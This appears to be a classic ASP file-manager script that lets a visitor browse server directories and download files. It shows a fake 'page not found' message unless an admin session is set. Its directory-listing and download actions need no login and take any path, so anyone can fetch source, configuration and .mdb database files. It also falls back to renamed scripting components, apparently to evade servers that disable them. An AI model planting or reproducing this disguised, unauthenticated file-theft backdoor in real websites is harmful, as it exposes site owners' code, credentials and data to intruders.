<!--#Include File="Config.Asp"-->
<%
'待完善中
' 修改时间：20111123
' 超级管理员Session("Administrator")="SuperAdmin"  可进入
' Call Rw("<iframe src='' name='Html' width=100% height=100%" & "></" & "iframe>")   处理成后台文件中这样代码处理错误，等完善
Dim Fso,F,Fc,MyFile
Dim DefaultDit,NewDefaultFSO,NewStream
'获得组件
DefaultDit="Scripting.Dictionary"
NewDefaultFSO="Scripting.FileSystemObject"
NewStream = "Adodb.Stream"
If ExistsObject("Scripting.Dictionary") = False Then	DefaultDit="Scripting.wang198060Dictionary"
If ExistsObject("Scripting.FileSystemObject") = False Then	NewDefaultFSO="Scripting.wang198060FileSystemObject"
If ExistsObject("Adodb.Stream") = False Then	NewStream="Adodb.wang198060Stream"


' 选择
Select Case Request("Action")
	Case "ShowDir":ShowDir()					' 循环目录
	Case "DF":DF()								' 下载文件
	Case Else Default2
End Select

' 显示目录
Sub ShowDir()
	Dim FileShowType,WebPath,ShowPhoto,SplStr,I,S,C,AspList,PhotoList,Ftype,OthreList,Div,Fname,DownStr,S1
	FileShowType=Request("FileShowType")							' 显示文件类型
	WebPath=Request("WebPath")										' 显示路径
	ShowPhoto=Request("ShowPhoto")									' 图片是否显示
	Call HandlePath(WebPath)    '获得完整路径 
	C = ShowRootFile(WebPath)
	If C = "" Then Call Eerr(WebPath & "此目录下没有文件")

	Call Echo(C,WebPath)
	SplStr = Split(C,vbCrlf)
	For I = 0 To Ubound(SplStr)
		S = SplStr(I)
		If S <> "" Then
			Ftype = Trim(Lcase(Right(S,3)))
			S1 = "|" & Ftype & "|"
			' 判断是否可显类型
			If InStr(FileShowType,S1) Then
				If Ftype = "asp" Or Ftype = "asa" Then
					AspList = AspList & S & vbCrlf
				ElseIf Ftype = "jpg" Or Ftype = "gif" Or Ftype = "png" Then
					PhotoList = PhotoList & S & vbCrlf
				Else
					OthreList = OthreList & S & vbCrlf
				End If
			End If
		End If
	Next

	If ShowPhoto = 1 Then
		If PhotoList = "" Then Call Eerr("提示","没有图片")
		C = PhotoList
		SplStr = Split(C,vbCrlf)
		For I = 0 To Ubound(SplStr)
			S = SplStr(I)
			If S <> "" Then	
				Fname = Right(S,Len(S)-InStrRev(S,"\"))
				DownStr = "<a href=?Action=DF&Path=" & S & ">下载</a>"
				Div = "<div style=""width:200px;height:120px;float:left;border:1px solid #333333;margin:2px;"">"
				Div=Div & "<img src='" & S & "'><br>" & Fname & DownStr &  "</div>"
				Call Rw(Div)
			End If
		Next
	Else
		C = AspList & OthreList & PhotoList
		SplStr = Split(C,vbCrlf)
		For I = 0 To Ubound(SplStr)
			S = SplStr(I)
			DownStr = "<a href=?Action=DF&Path=" & S & ">下载</a>"
			If S <> "" Then
				Call Echo(I,S & DownStr)
			End If
		Next
	End If
	Call Echo("","ss")
End Sub


' 下载文件
Sub DF()
	Dim Path
	Path = Request("Path")
	Call DownFile(Path)
End Sub

' 默认二
Sub Default2()
	If Session("Administrator")="SuperAdmin" Then
		Call Default()
		Response.End()
	End If
	Call Rw("<title>找不到网页</title>")
	Call Rw("<font color=#333333>找不到网页<p>正在查找的网页可能已被删除、重命名或暂时不可用。</font>")
End Sub
%>



<%
' 替换Response.Write对象
Function Rw(Str)
	Response.Write Str & vbCrlf
End Function

'输出信息
Function Echo(Word,Str)
	Response.Write "<font color=red>"&Word&":</font>"&Str&"<br>"
End Function

'测试显示信息并暂停
Function Eerr(Word,Str)
	Response.Write "<font color=green>"&Word&"</font>："&Str&"<br>":Response.End()
End Function

' Js 回显
Function JsMessage(Msg, Action)
	Dim Str,M
	M = Msg
	' 回显信息
	If Msg <> "" Then Msg = "alert('" & Msg & "');"
	' 返回上一级
	If Action = "-1" Then
		Str = "<script>" & Msg & "history.back(-1);</script>"
	' 返回上上一级
	ElseIf Action = "-2" Then
		Str = "<script>" & Msg & "history.back(-2);</script>"
	' 提示+新页打开
	ElseIf InStr(Action,"Open=") Then
		Action = Replace(Action,"Open=","")
		Str = "<script>" & Msg & "window.open('" & Action & "');</script>"
	' 为跳转URL
	ElseIf Action <> "" Then
		Str = "<script>" & Msg & "location.href='" & Action & "';</script>"
	' 动作为空
	ElseIf Action = "" Then
		If Msg = "" Then Msg = "点击返回"
		Str = "<a href=""javascript:history.back();"">" & M & "</a>"
	End If
	JsMessage = Str
End Function


' 循环显示当前文件列表
Function ShowRootFile(Path)
	Dim Fso,F,Fc,C
	Call HandlePath(Path)    '获得完整路径 
	Set Fso = CreateObject(NewDefaultFSO)
	If Not Fso.FolderExists(Path) Then Exit Function
	Set F = Fso.GetFolder(Path)
	For Each MyFile in F.Files
		C = C & MyFile & vbCrlf
	Next

	Set F = Nothing
	Set Fc = Nothing
	Set Fso = Nothing
	ShowRootFile = C
End Function

'判断组件
Function ExistsObject(Obj)
	On Error Resume Next
	Set T=Server.CreateObject(Obj)	
	Set T=Nothing
	If -2147221005 <> Err Then
		ExistsObject=True		
	Else		
		Err.Clear
		ExistsObject=False
	End If
End Function
 
' 下载文件程序
Function DownFile(Path)
	Dim OSM,SZ
	Call HandlePath(Path)    '获得完整路径 
	Response.Clear
	Set OSM = CreateObject(NewStream)
	OSM.Open
	OSM.Type = 1
	OSM.LoadFromFile Path
	sz=InstrRev(path,"\")+1
	Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(path,sz)
	Response.AddHeader "Content-Length", OSM.Size
	Response.Charset = "UTF-8"
	Response.ContentType = "application/octet-stream"
	Response.BinaryWrite OSM.Read
	Response.Flush
	Response.Write("")
	OSM.Close
	Set OSM = Nothing
End Function

' 默认
Sub Default()
	Dim FileShowType,WebPath,ShowPhoto
	WebPath = Server.MapPath("./")						' 网站路径
	FileShowType = "|asp|txt|ini|mdb|jpg|gif|png|"				' 显示类型

%>
<table width="912" border="0" cellpadding="0" cellspacing="1" bgcolor="#999999">
<form action="?Action=ShowDir" method="post" name="form1" target="Html" id="form1">
  <tr>
    <td width="51" height="24" align="center" bgcolor="#FFFFFF">路径：</td>
    <td width="415" bgcolor="#FFFFFF"><input name="WebPath" type="text" id="WebPath" value="<%=WebPath%>" size="50" />
    <input type="submit" name="button" id="button" value="提交" /></td>
    <td width="347" bgcolor="#FFFFFF">类型
    <input name="FileShowType" type="text" id="FileShowType" value="<%=FileShowType%>" size="40" /></td>
    <td width="94" bgcolor="#FFFFFF"><label for="ShowPhoto"><input name="ShowPhoto" type="checkbox" id="ShowPhoto" value="1"/>
    显示图片</label></td>
  </tr></form>
</table>
<%
Call Rw("<iframe src='' name='Html' width=100% height=100%" & "></" & "iframe>")
End Sub
%>
